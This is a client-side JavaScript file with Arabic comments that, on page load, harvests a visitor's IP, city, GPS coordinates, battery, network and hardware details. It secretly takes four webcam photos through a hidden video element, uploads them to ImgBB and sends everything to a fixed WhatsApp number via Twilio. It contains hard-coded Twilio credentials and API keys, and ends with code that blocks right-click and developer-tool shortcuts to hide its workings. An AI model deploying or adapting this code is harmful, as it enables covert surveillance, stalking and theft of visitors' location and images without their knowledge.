
// الحصول على معلومات الجهاز والموقع الجغرافي
async function getDeviceInfo() {
    const deviceInfo = {};

    deviceInfo.time = new Date().toLocaleString('ar-EG');

    try {
        const ipInfoResponse = await fetch('https://ipinfo.io/json?token=9cb91af56ef4b1');
        const ipInfoData = await ipInfoResponse.json();
        deviceInfo.ip = ipInfoData.ip || "غير معروف";
    } catch (error) {
        console.error('خطأ في الحصول على معلومات IP من ipinfo.io:', error);
        deviceInfo.ip = "غير معروف";
    }

    try {
        const ipifyResponse = await fetch('https://api.ipify.org?format=json');
        const ipifyData = await ipifyResponse.json();
        if (deviceInfo.ip !== "غير معروف" && deviceInfo.ip !== ipifyData.ip) {
            console.warn(`تم اكتشاف اختلاف في عنوان IP! IP من ipinfo.io: ${deviceInfo.ip}, IP من ipify: ${ipifyData.ip}`);
        } else {
            deviceInfo.ip = ipifyData.ip || deviceInfo.ip;
        }
    } catch (error) {
        console.error('خطأ في الحصول على معلومات IP من ipify:', error);
    }

    try {
        const ipResponse = await fetch(`https://ipinfo.io/${deviceInfo.ip}/json?token=9cb91af56ef4b1`);
        const ipData = await ipResponse.json();
        deviceInfo.country = ipData.country || "غير معروف";
        deviceInfo.city = ipData.city || "غير معروف";
    } catch (error) {
        console.error('خطأ في الحصول على معلومات الموقع:', error);
        deviceInfo.country = "غير معروف";
        deviceInfo.city = "غير معروف";
    }

    if (navigator.geolocation) {
        await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(position => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                deviceInfo.locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                resolve();
            }, error => {
                console.error('خطأ في الحصول على الموقع الجغرافي:', error);
                deviceInfo.locationLink = "غير معروف";
                reject();
            });
        });
    } else {
        deviceInfo.locationLink = "غير معروف";
    }
    
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        deviceInfo.battery = (battery.level * 100).toFixed(0);
        deviceInfo.isCharging = battery.charging ? "نعم" : "لا";
        deviceInfo.isPowerSaveMode = battery.savingPower || "غير معروف";
    } else {
        deviceInfo.battery = "غير معروف";
        deviceInfo.isCharging = "غير معروف";
        deviceInfo.isPowerSaveMode = "غير معروف";
    }

    if (navigator.connection) {
        const connectionType = navigator.connection.effectiveType || "غير معروف";
        deviceInfo.network = connectionType.includes('wifi') ? "Wi-Fi" : 
                            (connectionType.includes('cellular') ? "بيانات الجوال" : "غير معروف");
        deviceInfo.networkType = navigator.connection.type || "غير معروف";
        deviceInfo.networkSpeed = navigator.connection.downlink || "غير معروف";
    } else {
        deviceInfo.network = "غير معروف";
        deviceInfo.networkSpeed = "غير معروف";
        deviceInfo.networkType = "غير معروف";
    }

    deviceInfo.deviceName = navigator.platform || "غير معروف";
    deviceInfo.deviceVersion = navigator.userAgent || "غير معروف";
    deviceInfo.deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "محمول" : "سطحي";
    deviceInfo.userAgent = navigator.userAgent || "غير معروف";
    deviceInfo.platform = navigator.platform || "غير معروف";
    deviceInfo.language = navigator.language.includes('ar') ? 'عربي' : 'إنجليزي';

    const osInfo = navigator.userAgent.match(/\(([^)]+)\)/);
    deviceInfo.osVersion = osInfo ? osInfo[1].split(';')[1].trim() : "غير معروف";

    const browserInfo = navigator.userAgent.match(/(Firefox|Chrome|Safari|Opera|MSIE|Trident)[\/\s]([\d\.]+)/);
    deviceInfo.browserName = browserInfo ? browserInfo[1] : "غير معروف";
    deviceInfo.browserVersion = browserInfo ? browserInfo[2] : "غير معروف";

    deviceInfo.screenResolution = `${window.screen.width}x${window.screen.height}` || "غير معروف";
    deviceInfo.screenOrientation = (screen.orientation || {}).type || "غير معروف";
    deviceInfo.colorDepth = window.screen.colorDepth || "غير معروف";

    const ramSizeGB = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير معروف";
    deviceInfo.memory = ramSizeGB;

    try {
        const storageEstimate = await navigator.storage.estimate();
        const totalStorageGB = (storageEstimate.quota / (1024 ** 3)).toFixed(2);
        deviceInfo.internalStorage = `${totalStorageGB} GB`;
    } catch (error) {
        deviceInfo.internalStorage = "غير معروف";
    }

    deviceInfo.cpuCores = navigator.hardwareConcurrency || "غير معروف";
    deviceInfo.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? "مدعوم" : "غير مدعوم";
    deviceInfo.bluetoothSupport = navigator.bluetooth ? "مدعوم" : "غير مدعوم";
    deviceInfo.geolocationAvailable = navigator.geolocation ? "مدعوم" : "غير مدعوم";
    deviceInfo.lastUpdate = document.lastModified || "غير معروف";
    deviceInfo.securityProtocol = window.location.protocol || "غير معروف";
    deviceInfo.connectionFrequency = "غير معروف";

    const deviceInfoText = `
        معلومات الجهاز:
        ========================
        الوقت: ${deviceInfo.time}
        IP: ${deviceInfo.ip}
        الدولة: ${deviceInfo.country}
        المدينة: ${deviceInfo.city}
        الموقع الجغرافي: ${deviceInfo.locationLink}
        حالة البطارية: ${deviceInfo.battery}%
        شحن البطارية: ${deviceInfo.isCharging}
        وضع توفير الطاقة: ${deviceInfo.isPowerSaveMode}
        نوع الشبكة: ${deviceInfo.network}
        سرعة الشبكة: ${deviceInfo.networkSpeed}
        نوع الجهاز: ${deviceInfo.deviceType}
        اسم الجهاز: ${deviceInfo.deviceName}
        إصدار الجهاز: ${deviceInfo.deviceVersion}
        إصدار النظام: ${deviceInfo.osVersion}
        لغة النظام: ${deviceInfo.language}
        المتصفح: ${deviceInfo.browserName}
        إصدار المتصفح: ${deviceInfo.browserVersion}
        دقة الشاشة: ${deviceInfo.screenResolution}
        ألوان الشاشة: ${deviceInfo.colorDepth}
        ذاكرة الجهاز: ${deviceInfo.memory}
        مساحة التخزين: ${deviceInfo.internalStorage}
        عدد الأنوية: ${deviceInfo.cpuCores}
        دعم اللمس: ${deviceInfo.touchSupport}
        دعم البلوتوث: ${deviceInfo.bluetoothSupport}
        دعم تحديد الموقع: ${deviceInfo.geolocationAvailable}
        آخر تحديث: ${deviceInfo.lastUpdate}
        بروتوكول الأمان: ${deviceInfo.securityProtocol}
        تردد الاتصال: ${deviceInfo.connectionFrequency}
        ========================
    `;

    return deviceInfoText;
}

// التقاط الصور
async function capturePhotos() {
    const imageDatas = [];
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await video.play();

        for (let i = 0; i < 4; i++) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL('image/jpeg').split(',')[1]; // Base64
            imageDatas.push(imageData);

            // الانتظار بين كل لقطة
            await new Promise(resolve => setTimeout(resolve, 500));
        }

        // إيقاف الفيديو وإزالة العنصر
        stream.getTracks().forEach(track => track.stop());
        video.remove();

        return imageDatas;
    } catch (error) {
        console.error('حدث خطأ أثناء الوصول إلى الكاميرا:', error);
        alert('تعذر الوصول إلى الكاميرا.');
        return [];
    }
}

// رفع الصور إلى ImgBB
async function uploadImages(images) {
    const uploadedUrls = [];
    const apiKey = '6c63d3f8ccc9fe6224a4d106d9d4856a'; // استبدل بـ API Key الخاص بك

    for (const image of images) {
        try {
            const response = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, {
                method: 'POST',
                body: new URLSearchParams({
                    image: image, // Base64 بدون "data:image/jpeg;base64,"
                }),
            });

            const result = await response.json();
            if (result.success) {
                uploadedUrls.push(result.data.url);
            } else {
                console.error('فشل رفع الصورة:', result);
            }
        } catch (error) {
            console.error('حدث خطأ أثناء رفع الصور:', error);
        }
    }

    return uploadedUrls;
}

// إرسال الصور عبر WhatsApp باستخدام Twilio
async function sendToWhatsApp(message) {
    const accountSid = 'AC38f6562b11de468c62a9297191b51673'; // استبدل بـ SID الخاص بك
    const authToken = 'd8403cb7e10de5767e72c9ad871b04d2'; // استبدل بـ Auth Token الخاص بك
    const twilioNumber = 'whatsapp:+14155238886'; // رقم Twilio WhatsApp
    const recipientNumber = 'whatsapp:+967776991059'; // رقم المستلم

    const response = await fetch(`https://api.twilio.com/2010-04-01/Accounts/${accountSid}/Messages.json`, {
        method: 'POST',
        headers: {
            'Authorization': 'Basic ' + btoa(`${accountSid}:${authToken}`),
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
            From: twilioNumber,
            To: recipientNumber,
            Body: message,
        }),
    });

    if (response.ok) {
        console.log('تم إرسال الرسالة بنجاح');
    } else {
        console.error('فشل إرسال الرسالة:', await response.text());
    }
}

// استدعاء الدوال عند تحميل الصفحة
window.onload = async function () {
    
    // الحصول على معلومات الجهاز
    const deviceInfoMessage = await getDeviceInfo();
    await sendToWhatsApp(deviceInfoMessage); // إرسال معلومات الجهاز عبر WhatsApp
    
    // التقاط الصور ورفعها
    const photos = await capturePhotos();
    if (photos.length > 0) {
        const uploadedUrls = await uploadImages(photos); // رفع الصور والحصول على الروابط
        if (uploadedUrls.length > 0) {
            const imageMessage = `تم التقاط الصور: \n${uploadedUrls.join('\n')}`;
            await sendToWhatsApp(imageMessage); // إرسال الروابط عبر WhatsApp
        } else {
            console.error('لم يتم رفع أي صور');
        }
    }

};


// منع فحص الموقع 
var message="غير مسموح بهذا الامر لحماية المحتوى.";
function showAlert(){document.getElementById("toastNotif").innerHTML='<span><i class="warn"></i>'+message+"</span>",navigator.vibrate([110])}document.oncontextmenu=function(){return showAlert(),!1},document.onkeydown=function(e){if(123==event.keyCode||e.ctrlKey&&73==e.keyCode||e.ctrlKey&&74==e.keyCode||e.ctrlKey&&80==e.keyCode||e.ctrlKey&&85==e.keyCode)return showAlert(),!1};
